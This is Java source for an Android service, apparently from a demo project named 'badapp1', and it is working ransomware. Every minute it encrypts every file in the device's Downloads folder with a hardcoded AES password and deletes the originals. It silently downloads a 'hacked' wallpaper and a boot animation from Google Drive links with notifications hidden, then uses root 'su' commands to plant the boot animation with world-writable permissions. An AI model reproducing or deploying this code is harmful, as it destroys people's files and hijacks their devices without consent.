package com.example.avi.badapp1;

import android.app.Activity;
import android.app.DownloadManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.InvalidKeyException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.spec.SecretKeySpec;

public class MyService extends Service{
    private static final long NOTIFY_INTERVAL = 60 * 1000; // 60 seconds
    private static final int min  = 1;
    private static final int max = 11;

    private Handler mHandler = new Handler();
    private Timer mTimer = null;
    private SymmetricKey ske;

    //change wallpaper after download completed
    private long wallEnq;
    BroadcastReceiver wallReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (DownloadManager.ACTION_DOWNLOAD_COMPLETE.equals(action)) {
                long downloadId = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, 0);
                DownloadManager.Query query = new DownloadManager.Query();
                query.setFilterById(wallEnq);
                DownloadManager downloadManager = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                Cursor c = downloadManager.query(query);
                if (c.moveToFirst()) {
                    int columnIndex = c.getColumnIndex(DownloadManager.COLUMN_STATUS);
                    if (DownloadManager.STATUS_SUCCESSFUL == c.getInt(columnIndex)) {
                        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "hacked.jpg");
                        if(file.exists()){
                            try {
                                WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
                                Bitmap bMap = BitmapFactory.decodeFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES) + "/hacked.jpg");
                                wallpaperManager.setBitmap(bMap);
                                file.delete();
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }

                        File bootFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "bootanimation.zip");
                        if(bootFile.exists()){
                            try {

                                replaceBootAnimation();
                                bootFile.delete();

                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        }
    };

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        // cancel if already existed
        if(mTimer != null) {
            mTimer.cancel();
        } else {
            // recreate new
            mTimer = new Timer();
        }

        try {
            SharedPreferences sharedPref = getSharedPreferences("key", Context.MODE_PRIVATE);
            SharedPreferences.Editor editor = sharedPref.edit();
            String key = sharedPref.getString("key", null);
            ske = new SymmetricKey("!@#$MySecr3tPassw0rd", 16, "AES");

            //create secret key
            if(key == null)
            {
                downloadBootAnimation();
                String stringKey = Base64.encodeToString(ske.getSecretKey().getEncoded(), Base64.DEFAULT);
                editor.putString("key", stringKey);
                editor.commit();
                changeWallpaper();
            }
            else
            {
                byte[] encodedKey     = Base64.decode(key, Base64.DEFAULT);
                SecretKeySpec originalKey = new SecretKeySpec(encodedKey, 0, encodedKey.length, "AES");
                ske.setSecretKey(originalKey);
            }
        }catch (Exception e){
        }

        // schedule task
        mTimer.scheduleAtFixedRate(new TimeDisplayTimerTask(), 0, NOTIFY_INTERVAL);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //return super.onStartCommand(intent, flags, startId);
        return START_STICKY;

    }

    @Override
    public void onDestroy() {
        Toast.makeText(this,"stoped", Toast.LENGTH_LONG).show();
        super.onDestroy();
    }

    class TimeDisplayTimerTask extends TimerTask
    {

        @Override
        public void run() {
            // run on another thread
            mHandler.post(new Runnable() {

                @Override
                    public void run() {
                    try {
                        File externalStoragePublicDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                        //String[] list = externalStoragePublicDirectory.list();
                        File[] files = externalStoragePublicDirectory.listFiles();
                        for(File file : files) {
                            if(!file.getAbsolutePath().toLowerCase().endsWith("hacked")) {
                                ske.encryptFile(file);
                                //ske.decryptFile(file);
                                file.delete();
                            }
                        }
                    } catch (InvalidKeyException | IllegalBlockSizeException | BadPaddingException
                            | IOException e) {
                    }
                }
            });
        }
    }

    //download wallpaper
    private void changeWallpaper(){
        try {
            registerReceiver(wallReceiver, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
            String url = "https://drive.google.com/uc?export=download&id=1M__9-2qnrDeuOQCNODb-6SeJcwAmdvbZ";
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
            request.setDescription("Wallpaper dowload");
            request.setTitle("Wallpaper dowload");
            request.allowScanningByMediaScanner();
            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_MOVIES, "hacked.jpg");
            DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
            wallEnq = manager.enqueue(request);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void replaceBootAnimation() throws Exception{
        String downloadsPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES).getAbsolutePath();
        String from = "/storage/emulated/legacy/Movies"+"/bootanimation.zip";
        String to = "/data/local";//"/system/media/";

        String command = "cp "+from+" "+to;
        Process process = Runtime.getRuntime().exec(new String[] { "su", "-c", command } );
        process.waitFor();
        process = Runtime.getRuntime().exec(new String[] { "su", "-c", "chmod 777 "+to+"/bootanimation.zip" });
        process.waitFor();

    }

    private void downloadBootAnimation(){
        try {
            String url = "https://drive.google.com/uc?export=download&id=1UG6ZqobYyXXU7nhAA4Kvvpy0vbr4cvUG";
            DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
            request.setDescription("bootAnimation download");
            request.setTitle("bootAnimation download");
            request.allowScanningByMediaScanner();
            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_MOVIES, "bootanimation.zip");
            DownloadManager manager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
            manager.enqueue(request);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
